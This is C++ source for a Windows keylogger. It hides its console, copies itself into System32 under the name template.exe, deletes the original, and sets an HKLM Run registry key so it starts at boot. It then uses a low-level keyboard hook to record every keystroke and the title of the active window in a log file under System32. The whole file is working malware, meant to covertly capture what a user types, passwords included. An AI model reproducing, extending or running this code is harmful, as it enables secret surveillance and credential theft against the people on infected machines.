#include <Windows.h>
#include <string>
#include <sstream>
#include <iostream>

HHOOK keyBoardHook;
char cWindow[1000];
HWND lastWindow = NULL;
HANDLE file;
std::string DayOfWeek(int code)
{
	switch (code)
	{
	case 0: return (std::string) "[SUNDAY]";
	case 1: return (std::string) "[MONDAY]";
	case 2: return (std::string) "[TUESDAY]";
	case 3: return (std::string) "[WEDNESDAY]";
	case 4: return (std::string) "[THURSDAY]";
	case 5: return (std::string) "[FRIDAY]";
	case 6: return (std::string) "[SATURDAY]";
	}
	return (std::string) "[UNK_DayOfWeek]";
}
void writefile(std::string s)
{
	LPDWORD numwrite = 0;
	DWORD x = s.size();
	char arr[1000];
	strcpy_s(arr, s.c_str());
	WriteFile(file, arr, x, numwrite, 0);
	//std::cout << GetLastError() << std::endl;
}
std::string ItS(int code)
{
	std::stringstream ss;
	ss << "0x" << std::hex << code;
	return ss.str();
}
std::string translate(DWORD code, bool caps, bool shift)
{
	switch (code)
	{
		//char key ascii
	case 0x41: return  caps ? (shift ? "a" : "A") : (shift ? "A" : "a");
	case 0x42: return  caps ? (shift ? "b" : "B") : (shift ? "B" : "b");
	case 0x43: return  caps ? (shift ? "c" : "C") : (shift ? "C" : "c");
	case 0x44: return  caps ? (shift ? "d" : "D") : (shift ? "D" : "d");
	case 0x45: return  caps ? (shift ? "e" : "E") : (shift ? "E" : "e");
	case 0x46: return  caps ? (shift ? "f" : "F") : (shift ? "F" : "f");
	case 0x47: return  caps ? (shift ? "g" : "G") : (shift ? "G" : "g");
	case 0x48: return  caps ? (shift ? "h" : "H") : (shift ? "H" : "h");
	case 0x49: return  caps ? (shift ? "i" : "I") : (shift ? "I" : "i");
	case 0x4A: return  caps ? (shift ? "j" : "J") : (shift ? "J" : "j");
	case 0x4B: return  caps ? (shift ? "k" : "K") : (shift ? "K" : "k");
	case 0x4C: return  caps ? (shift ? "l" : "L") : (shift ? "L" : "l");
	case 0x4D: return  caps ? (shift ? "m" : "M") : (shift ? "M" : "m");
	case 0x4E: return  caps ? (shift ? "n" : "N") : (shift ? "N" : "n");
	case 0x4F: return  caps ? (shift ? "o" : "O") : (shift ? "O" : "o");
	case 0x50: return  caps ? (shift ? "p" : "P") : (shift ? "P" : "p");
	case 0x51: return  caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q");
	case 0x52: return  caps ? (shift ? "r" : "R") : (shift ? "R" : "r");
	case 0x53: return  caps ? (shift ? "s" : "S") : (shift ? "S" : "s");
	case 0x54: return  caps ? (shift ? "t" : "T") : (shift ? "T" : "t");
	case 0x55: return  caps ? (shift ? "u" : "U") : (shift ? "U" : "u");
	case 0x56: return  caps ? (shift ? "v" : "V") : (shift ? "V" : "v");
	case 0x57: return  caps ? (shift ? "w" : "W") : (shift ? "W" : "w");
	case 0x58: return  caps ? (shift ? "x" : "X") : (shift ? "X" : "x");
	case 0x59: return  caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y");
	case 0x5A: return  caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z");
		//Sleep key
	case VK_SLEEP: return "[SLEEP]";
		// Num Keyboard 
	case VK_NUMPAD0:  return "0";
	case VK_NUMPAD1:  return "1";
	case VK_NUMPAD2: return "2";
	case VK_NUMPAD3:  return "3";
	case VK_NUMPAD4:  return "4";
	case VK_NUMPAD5:  return "5";
	case VK_NUMPAD6:  return "6";
	case VK_NUMPAD7:  return "7";
	case VK_NUMPAD8:  return "8";
	case VK_NUMPAD9:  return "9";
	case VK_MULTIPLY: return "*";
	case VK_ADD:      return "+";
	case VK_SEPARATOR: return "-";
	case VK_SUBTRACT: return "-";
	case VK_DECIMAL:  return ".";
	case VK_DIVIDE:   return "/";
		// Function Keys
	case VK_F1:  return "[F1]";
	case VK_F2:  return "[F2]";
	case VK_F3:  return "[F3]";
	case VK_F4:  return "[F4]";
	case VK_F5:  return "[F5]";
	case VK_F6:  return "[F6]";
	case VK_F7:  return "[F7]";
	case VK_F8:  return "[F8]";
	case VK_F9:  return "[F9]";
	case VK_F10:  return "[F10]";
	case VK_F11:  return "[F11]";
	case VK_F12:  return "[F12]";
	case VK_F13:  return "[F13]";
	case VK_F14:  return "[F14]";
	case VK_F15:  return "[F15]";
	case VK_F16:  return "[F16]";
	case VK_F17:  return "[F17]";
	case VK_F18:  return "[F18]";
	case VK_F19:  return "[F19]";
	case VK_F20:  return "[F20]";
	case VK_F21:  return "[F22]";
	case VK_F22:  return "[F23]";
	case VK_F23:  return "[F24]";
	case VK_F24:  return "[F25]";
		// Keys
	case VK_NUMLOCK: return "[NUM-LOCK]";
	case VK_SCROLL:  return "[SCROLL-LOCK]";
	case VK_BACK:    return "[BACK]";
	case VK_TAB:     return "[TAB]";
	case VK_CLEAR:   return "[CLEAR]";
	case VK_RETURN:  return "[ENTER]";
	case VK_SHIFT:   return "[SHIFT]";
	case VK_CONTROL: return "[CTRL]";
	case VK_MENU:    return "[ALT]";
	case VK_PAUSE:   return "[PAUSE]";
	case VK_CAPITAL: return "[CAP-LOCK]";
	case VK_ESCAPE:  return "[ESC]";
	case VK_SPACE:   return "[SPACE]";
	case VK_PRIOR:   return "[PAGEUP]";
	case VK_NEXT:    return "[PAGEDOWN]";
	case VK_END:     return "[END]";
	case VK_HOME:    return "[HOME]";
	case VK_LEFT:    return "[LEFT]";
	case VK_UP:      return "[UP]";
	case VK_RIGHT:   return "[RIGHT]";
	case VK_DOWN:    return "[DOWN]";
	case VK_SELECT:  return "[SELECT]";
	case VK_PRINT:   return "[PRINT]";
	case VK_SNAPSHOT: return "[PRTSCRN]";
	case VK_INSERT:  return "[INS]";
	case VK_DELETE:  return "[DEL]";
	case VK_HELP:    return "[HELP]";
		// Number Keys with shift
	case 0x30:  return shift ? "!" : "1";
	case 0x31:  return shift ? "@" : "2";
	case 0x32:  return shift ? "#" : "3";
	case 0x33:  return shift ? "$" : "4";
	case 0x34:  return shift ? "%" : "5";
	case 0x35:  return shift ? "^" : "6";
	case 0x36:  return shift ? "&" : "7";
	case 0x37:  return shift ? "*" : "8";
	case 0x38:  return shift ? "(" : "9";
	case 0x39:  return shift ? ")" : "0";
		// Windows Keys
	case VK_LWIN:     return "[WIN]";
	case VK_RWIN:     return "[WIN]";
	case VK_LSHIFT:   return "[SHIFT]";
	case VK_RSHIFT:   return "[SHIFT]";
	case VK_LCONTROL: return "[CTRL]";
	case VK_RCONTROL: return "[CTRL]";
		// OEM Keys with shift 
	case VK_OEM_1:      return shift ? ":" : ";";
	case VK_OEM_PLUS:   return shift ? "+" : "=";
	case VK_OEM_COMMA:  return shift ? "<" : ",";
	case VK_OEM_MINUS:  return shift ? "_" : "-";
	case VK_OEM_PERIOD: return shift ? ">" : ".";
	case VK_OEM_2:      return shift ? "?" : "/";
	case VK_OEM_3:      return shift ? "~" : "`";
	case VK_OEM_4:      return shift ? "{" : "[";
	case VK_OEM_5:      return shift ? "\\" : "|";
	case VK_OEM_6:      return shift ? "}" : "]";
	case VK_OEM_7:      return shift ? "'" : "'";
		// Action Keys
	case VK_PLAY:       return "[PLAY]";
	case VK_ZOOM:       return "[ZOOM]";
	case VK_OEM_CLEAR:  return "[CLEAR]";
	case VK_CANCEL:     return "[CTRL-C]";
	default: return ItS(code);
	}
}
std::string timeLog()
{
	SYSTEMTIME t;
	GetLocalTime(&t);
	int day = t.wDay;
	int month = t.wMonth;
	int year = t.wYear;
	int hour = t.wHour;
	int min = t.wMinute;
	int sec = t.wSecond;
	int dayName = t.wDayOfWeek;
	std::stringstream ss;
	ss << "\n[+] " + DayOfWeek(dayName) + " ";
	ss << day;
	ss << "/";
	ss << month;
	ss << "/";
	ss << year;
	ss << " ";
	ss << hour;
	ss << ":";
	ss << min;
	ss << ":";
	ss << sec;
	ss << " ";
	return ss.str();
}
HANDLE HookCode(DWORD code, bool caps, bool shift)
{
	file = CreateFileA("C:\\Windows\\System32\\cap.log",
		GENERIC_WRITE,
		2,
		NULL,
		4,
		FILE_ATTRIBUTE_NORMAL,
		0);
	if (file == (HANDLE)-1)
	{
		std::cout << "Can't create file" << std::endl;
		return (HANDLE)0;
	}
	SetFilePointer(file, 0, 0, 2);
	HWND currentWindow = GetForegroundWindow();
	if (currentWindow != lastWindow)
	{
		writefile(timeLog());
		int c = GetWindowTextA(GetForegroundWindow(), cWindow, 999);
		writefile((std::string)cWindow + "\n");
		lastWindow = currentWindow;
	}
	// real capture
	writefile(translate(code, caps, shift));
	return (HANDLE)CloseHandle(file);
}

LRESULT CALLBACK HookProc(int code, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
	bool caps = (GetKeyState(VK_CAPITAL) ? true : false);
	bool shift = false;
	if (code == HC_ACTION)
	{
		if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
		{
			if (wParam == WM_KEYDOWN)
			{
				shift = true;
			}
			if (wParam == WM_KEYUP)
			{
				shift = true;
			}
			else shift = false;
		}
		if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
		{

			if (p->vkCode)
			{
				HookCode(p->vkCode, caps, shift);
			}
		}
	}

	return CallNextHookEx(NULL, code, wParam, lParam);
}
int main()
{
	FreeConsole();
	HANDLE mtx;
	//check another version
	if (OpenMutex(MUTEX_ALL_ACCESS, 0, L"taolaichemchetchamaygio"))
		return 0;
	mtx = CreateMutex(0, 0, L"taolaichemchetchamaygio");
	//check where am i
	TCHAR cmdline[MAX_PATH];
	GetModuleFileName(NULL, cmdline, MAX_PATH);
	if (wcscmp(L"C:\\Windows\\System32\\template.exe", cmdline))
	{
		// do copy
		CopyFile(cmdline, L"C:\\Windows\\System32\\template.exe", true);
		ReleaseMutex(mtx);
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		LPCWSTR cmtPath = L"C:\\Windows\\System32\\cmd.exe";
		LPWSTR cmtArg = const_cast<LPWSTR>(TEXT("C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\System32\\template.exe"));
		if (CreateProcess(cmtPath, cmtArg, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
		{
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		cmtPath = L"C:\\Windows\\System32\\cmd.exe";
		LPWSTR cmtArg1 = const_cast<LPWSTR>(TEXT("C:\\Windows\\System32\\cmd.exe /c del /f template.exe"));
		if (CreateProcess(cmtPath, cmtArg1, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
		{
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}
		return 0;
	}

	//check registry
	HKEY key{};
	char subKey[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_ALL_ACCESS, &key) == ERROR_SUCCESS)
	{
		DWORD data;
		const byte x[] = "C:\\Windows\\System32\\template.exe";
		RegSetValueExA(key, "Hihi", 0, 1, x, 33);
	}
	keyBoardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
		HookProc,
		GetModuleHandle(NULL),
		0);
	if (!keyBoardHook)
	{
		return 0;
	}
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(keyBoardHook);
	return 0;
}